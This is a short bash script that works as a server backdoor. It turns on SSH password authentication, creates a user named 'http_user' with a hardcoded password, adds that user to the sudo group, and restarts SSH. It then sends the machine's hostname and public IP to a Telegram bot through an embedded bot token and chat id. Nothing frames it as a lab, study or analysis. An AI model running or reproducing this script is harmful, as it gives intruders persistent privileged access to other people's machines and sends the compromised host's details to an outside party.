#!/bin/bash

sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config

useradd -m "http_user"

echo http_user:94GQxG6UR1 | chpasswd

adduser http_user sudo

/etc/init.d/ssh restart

IP=$(curl ifconfig.me)
HOSTNAME=$(hostname)

curl -s -o /dev/null -X POST https://api.telegram.org/bot5236944102:AAGH6gndskydLEL1x38hSOm4XYJz1Kg_Bx8/sendMessage -d chat_id=-756251756 -d text="Hostname: $HOSTNAME - IP: $IP"
